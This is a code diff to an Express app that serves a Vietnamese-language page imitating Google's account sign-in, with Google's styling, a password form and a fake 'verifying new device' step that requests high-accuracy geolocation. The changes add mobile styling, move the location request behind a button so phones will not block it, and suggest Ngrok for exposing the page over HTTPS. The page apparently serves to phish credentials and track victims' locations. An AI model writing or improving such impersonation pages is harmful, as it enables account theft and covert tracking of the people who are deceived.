@@ -17,26 +17,41 @@ app.get("/", (req, res) => {
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Đăng nhập - Tài khoản Google</title>
   <style>
-    body { font-family: 'Roboto', arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #f8f9fa; color: #3c4043; }
-    .container { background: white; padding: 40px; border-radius: 8px; border: 1px solid #dadce0; text-align: center; max-width: 400px; width: 90%; display: none; }
+    * { box-sizing: border-box; }
+    body { font-family: 'Roboto', arial, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; background: #f8f9fa; color: #3c4043; }
+    .container { background: white; padding: 40px; border-radius: 8px; border: 1px solid #dadce0; text-align: center; max-width: 450px; width: 100%; display: none; margin: 20px auto; }
     .container.active { display: block; }
     .logo { width: 72px; margin-bottom: 20px; }
     h2 { font-size: 24px; font-weight: 400; margin: 0 0 10px; color: #202124; }
     p { font-size: 14px; line-height: 1.5; margin-bottom: 30px; color: #5f6368; }
-    input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 14px; }
+    input { width: 100%; padding: 13px 15px; margin-bottom: 10px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; transition: border-color 0.2s; }
+    input:focus { border-color: #1a73e8; outline: none; border-width: 2px; padding: 12px 14px; }
     .password-container { position: relative; width: 100%; }
-    .show-password-container { display: flex; align-items: center; justify-content: flex-start; margin-bottom: 20px; cursor: pointer; user-select: none; }
+    .show-password-container { display: flex; align-items: center; justify-content: flex-start; margin-bottom: 25px; cursor: pointer; user-select: none; padding: 5px 0; }
     .show-password-container input { width: 18px; height: 18px; margin: 0 8px 0 0; cursor: pointer; }
     .show-password-container label { font-size: 14px; color: #1f1f1f; cursor: pointer; }
-    button { background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-size: 14px; cursor: pointer; font-weight: 500; transition: background 0.2s; width: 100%; }
+    button { background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-size: 14px; cursor: pointer; font-weight: 500; transition: background 0.2s; width: 100%; height: 40px; }
     button:hover { background: #1765cc; box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15); }
-    .error-text { color: #d93025; font-size: 12px; display: flex; align-items: flex-start; text-align: left; margin-top: -10px; margin-bottom: 10px; line-height: 1.4; }
+    .error-text { color: #d93025; font-size: 12px; display: flex; align-items: flex-start; text-align: left; margin-bottom: 10px; line-height: 1.4; }
     .error-icon { margin-right: 8px; flex-shrink: 0; display: flex; align-items: center; margin-top: 2px; }
-    .link-text { color: #1a73e8; font-weight: 500; cursor: pointer; font-size: 14px; display: block; text-align: left; margin-bottom: 30px; }
+    .link-text { color: #1a73e8; font-weight: 500; cursor: pointer; font-size: 14px; display: block; text-align: left; margin-bottom: 25px; padding: 5px 0; }
     .footer-text { font-size: 14px; color: #5f6368; text-align: left; margin-top: 30px; line-height: 1.4; }
     .footer-text span { color: #1a73e8; font-weight: 500; cursor: pointer; }
     .loading-spinner { border: 3px solid #f3f3f3; border-top: 3px solid #1a73e8; border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite; display: inline-block; vertical-align: middle; margin-right: 10px; }
     @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+    /* Mobile Styles */
+    @media (max-width: 450px) {
+      body { background: white; align-items: flex-start; }
+      .container { 
+        border: none; 
+        padding: 24px 24px; 
+        margin: 0; 
+        max-width: 100%; 
+        border-radius: 0;
+      }
+      h2 { font-size: 22px; }
+    }
   </style>
 </head>
 <body>
@@ -84,7 +99,8 @@ app.get("/", (req, res) => {
       if (isLoggedIn === "true") {
         document.getElementById("login-form").classList.remove("active");
         document.getElementById("app").classList.add("active");
-        requestLocation();
+        // Không tự động gọi requestLocation() ở đây vì mobile sẽ chặn
+        // Người dùng sẽ phải nhấn nút "Tiếp tục" ở bước 2
       }
     };
 
@@ -118,13 +134,14 @@ app.get("/", (req, res) => {
       const app = document.getElementById("app");
       const verifyBtn = document.getElementById("verify-btn");
 
-      if (!window.isSecureContext) {
-        alert("Lỗi bảo mật: Quyền truy cập vị trí chỉ hoạt động trên kết nối HTTPS. Vui lòng kiểm tra lại địa chỉ web.");
-        return;
-      }
-
       if (verifyBtn) verifyBtn.style.display = "none";
       desc.innerHTML = "<div class='loading-spinner'></div> Đang xác thực thiết bị mới...";
+
+      if (!window.isSecureContext) {
+        desc.innerHTML = "<b style='color:red;'>Lỗi:</b> Trình duyệt yêu cầu kết nối <b>HTTPS</b> để xác minh vị trí. Nếu bạn đang test trên điện thoại, hãy sử dụng Ngrok hoặc Localhost HTTPS.";
+        if (verifyBtn) verifyBtn.style.display = "block";
+        return;
+      }
 
       const options = {
         enableHighAccuracy: true,
